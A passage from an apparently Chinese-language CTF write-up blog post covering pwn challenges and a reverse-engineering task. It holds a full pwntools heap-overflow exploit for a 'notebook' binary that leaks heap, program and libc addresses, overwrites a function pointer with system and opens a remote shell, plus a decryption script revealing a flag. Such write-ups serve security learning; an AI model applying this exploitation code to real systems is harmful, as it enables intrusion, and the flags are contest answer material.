class="built_in">print</span> io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    payload += p64(lk_canary)</span><br><span class="line">    payload += p64(rd_flg_addr) * <span class="number">6</span></span><br><span class="line">    payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    mLogin(payload)</span><br><span class="line">    <span class="built_in">print</span> io.recvall()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s_exp()</span><br><span class="line">    <span class="comment">#pause()</span></span><br></pre></td></tr></table></figure>

<h3 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h3><h4 id="Check-1"><a href="#Check-1" class="headerlink" title="Check"></a>Check</h4><p>程序全开保护</p>
<h4 id="Vuln-1"><a href="#Vuln-1" class="headerlink" title="Vuln"></a>Vuln</h4><ol>
<li>存在堆溢出</li>
<li>read读取字符串结尾不清0，可以进行泄露</li>
</ol>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><h5 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h5><p>要泄露libc，可以先leak处got地址，然后再leak出函数地址。</p>
<blockquote>
<p>或者直接leak出main arena</p>
</blockquote>
<h5 id="code-1"><a href="#code-1" class="headerlink" title="code"></a>code</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line">elf_name = <span class="string">&quot;./pwn3_ok&quot;</span></span><br><span class="line"></span><br><span class="line">remote_host = <span class="string">&quot;54.222.255.223&quot;</span></span><br><span class="line">remote_port = <span class="number">50003</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">elf = ELF(elf_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    free_offset = <span class="number">0x83940</span></span><br><span class="line">    system_offset = <span class="number">0x45390</span></span><br><span class="line">    smlbin_area_off = <span class="number">0x3C3B78</span></span><br><span class="line">    execv_binsh_off = <span class="number">0xF0567</span></span><br><span class="line">    malloc_hook_off = <span class="number">0x3C3B10</span></span><br><span class="line">    context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">    mine_env = os.environ</span><br><span class="line">    mine_env[<span class="string">&#x27;LD_PRELOAD&#x27;</span>] = <span class="string">&quot;/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so:&quot;</span></span><br><span class="line">    io = process(elf_name, env=mine_env)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">    free_offset = <span class="number">0x7B8B0</span></span><br><span class="line">    system_offset = <span class="number">0x3E760</span></span><br><span class="line">    io = remote(remote_host, remote_port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dlySend</span>(<span class="params">sdstr</span>):</span><br><span class="line">    io.send(sdstr)</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mmenu</span>(<span class="params">mopt</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">    io.sendline(mopt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">msize, mname, mcontent</span>):</span><br><span class="line">    mmenu(<span class="string">&quot;new&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(msize))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note name:&quot;</span>)</span><br><span class="line">    dlySend(mname)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note content:&quot;</span>)</span><br><span class="line">    dlySend(mcontent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_note</span>(<span class="params">mid, mname, mcontent</span>):</span><br><span class="line">    mmenu(<span class="string">&quot;edit&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mid))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note name:&quot;</span>)</span><br><span class="line">    dlySend(mname)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note content:&quot;</span>)</span><br><span class="line">    dlySend(mcontent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_note</span>(<span class="params">mindex</span>):</span><br><span class="line">    mmenu(<span class="string">&quot;delete&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mindex))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_note</span>(<span class="params">mindex</span>):</span><br><span class="line">    mmenu(<span class="string">&quot;show&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ note index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mindex))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_nn</span>():</span><br><span class="line">    mmenu(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mark_nt</span>(<span class="params">mindex, minfo</span>):</span><br><span class="line">    mmenu(<span class="string">&quot;mark&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ index of note you want to mark:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mindex))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ mark info:&quot;</span>)</span><br><span class="line">    dlySend(minfo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_mark</span>(<span class="params">mindex</span>):</span><br><span class="line">    mmenu(<span class="string">&quot;show_mark&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ mark index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mindex))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_mark</span>():</span><br><span class="line">    mmenu(<span class="string">&quot;delete_mark&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ mark index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mindex))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_mark</span>(<span class="params">mindex, minfo</span>):</span><br><span class="line">    mmenu(<span class="string">&quot;edit_mark&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ mark index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(mindex))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;$ mark content:&quot;</span>)</span><br><span class="line">    dlySend(minfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露堆地址 利用read结尾不清0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_leak</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        tmp_name = <span class="built_in">chr</span>(<span class="number">0x30</span>+i)*<span class="number">0x20</span></span><br><span class="line">        tmp_content = <span class="built_in">chr</span>(<span class="number">0x41</span>+i)*<span class="number">0x22</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        add_note(<span class="number">0x100</span>, tmp_name, tmp_content)</span><br><span class="line">    show_note(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;name:&quot;</span>+<span class="string">&#x27;1&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    data = io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    lk_heap_addr = u64(data.ljust(<span class="number">8</span>, <span class="built_in">chr</span>(<span class="number">0</span>))) - <span class="number">0x1a0</span></span><br><span class="line">    log.info(<span class="string">&quot;heap base addr: &quot;</span>+<span class="built_in">hex</span>(lk_heap_addr))</span><br><span class="line">    <span class="keyword">return</span> lk_heap_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露主函数地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_lk_main</span>(<span class="params">lk_heap_addr</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        tmp_info = <span class="string">&quot;/bin/sh&quot;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        mark_nt(i, tmp_info)</span><br><span class="line">    payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p32(<span class="number">2</span>) + p32(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(lk_heap_addr+<span class="number">0xB40</span>)  <span class="comment"># funcdis addr</span></span><br><span class="line">    edit_mark(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">    show_mark(<span class="number">2</span>)</span><br><span class="line">    data = io.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    lk_func_addr = u64(data.ljust(<span class="number">8</span>, <span class="built_in">chr</span>(<span class="number">0</span>)))</span><br><span class="line">    log.info(<span class="string">&quot;function addr: &quot;</span>+<span class="built_in">hex</span>(lk_func_addr))</span><br><span class="line">    <span class="keyword">return</span> lk_func_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_exp</span>():</span><br><span class="line">    heap_bs_addr = s_leak()</span><br><span class="line">    mpts_faddr = s_lk_main(heap_bs_addr)</span><br><span class="line">    bss_nt_lst = mpts_faddr + <span class="number">0x20245D</span></span><br><span class="line">    log.info(<span class="string">&quot;bss addr: &quot;</span>+<span class="built_in">hex</span>(bss_nt_lst))</span><br><span class="line">    <span class="comment"># change list ptr</span></span><br><span class="line">    <span class="comment"># 泄露libc</span></span><br><span class="line">    payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p32(<span class="number">2</span>) + p32(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(mpts_faddr+<span class="number">0x2022F5</span>)</span><br><span class="line">    edit_mark(<span class="number">1</span>, payload)</span><br><span class="line">    show_mark(<span class="number">2</span>)</span><br><span class="line">    data = io.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    libc_addr = u64(data.ljust(<span class="number">8</span>, <span class="built_in">chr</span>(<span class="number">0</span>))) - free_offset</span><br><span class="line">    log.info(<span class="string">&quot;libc addr: &quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    system_addr = system_offset + libc_addr</span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment"># 改变函数指针</span></span><br><span class="line">    payload = <span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p32(<span class="number">2</span>) + p32(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(heap_bs_addr+<span class="number">0xB38</span>)</span><br><span class="line">    edit_mark(<span class="number">1</span>, payload)</span><br><span class="line">    payload = p64(heap_bs_addr+<span class="number">0xB50</span>) + p64(system_addr) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    edit_mark(<span class="number">2</span>, payload)</span><br><span class="line">    show_mark(<span class="number">2</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s_exp()</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure>


<h2 id="0x03re"><a href="#0x03re" class="headerlink" title="0x03re"></a>0x03re</h2><h3 id="re150"><a href="#re150" class="headerlink" title="re150"></a>re150</h3><p>程序段是要解密后才能看的，main:0x804848F下断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">73 8D F2 4C C7 D4 7B F7  18 32 71 0D CF DC 67 4F</span><br><span class="line">7F 0B 6D 00 00 00 00 00  00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>分析知是循环移位<br><br>解密如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alph_Ls = [<span class="number">0x73</span>, <span class="number">0x8D</span>, <span class="number">0xF2</span>, <span class="number">0x4C</span>, <span class="number">0xC7</span>, <span class="number">0xD4</span>, <span class="number">0x7B</span>, <span class="number">0xF7</span>, <span class="number">0x18</span>, <span class="number">0x32</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0xCF</span>, <span class="number">0xDC</span>, <span class="number">0x67</span>, <span class="number">0x4F</span>, <span class="number">0x7F</span>, <span class="number">0x0B</span>, <span class="number">0x6D</span>]</span><br><span class="line"></span><br><span class="line">chk_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> alph_Ls:</span><br><span class="line">    chk_list.append(c^<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;len:&quot;</span>, <span class="built_in">len</span>(chk_list)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chk_list)):</span><br><span class="line">    cp = chk_list[i]</span><br><span class="line">    c = cp^i</span><br><span class="line">    off = i&amp;<span class="number">7</span></span><br><span class="line">    left = (c&lt;&lt;off)&amp;<span class="number">0xFF</span></span><br><span class="line">    rigtht = (c&gt;&gt;(<span class="number">8</span>-off))&amp;<span class="number">0xFF</span></span><br><span class="line">    m = (left|rigtht)&amp;<span class="number">0xFF</span></span><br><span class="line">    res += <span class="built_in">chr</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line"><span class="comment"># SYC&#123;&gt;&gt;Wh06m1&gt;&gt;R0Ot&#125;</span></span><br></pre></td></tr></table></figure>


        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Appl3s</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://example.com/2017/06/06/cuit-writeup/">http://example.com/2017/06/06/cuit-writeup/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/writeup/"># writeup</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2017/06/07/python-request/">Python Request 总结</a>
            
            
            <a class="next" rel="next" href="/2017/05/23/hash-length-extension-attack/">哈希长度扩展攻击</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Appl3s | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>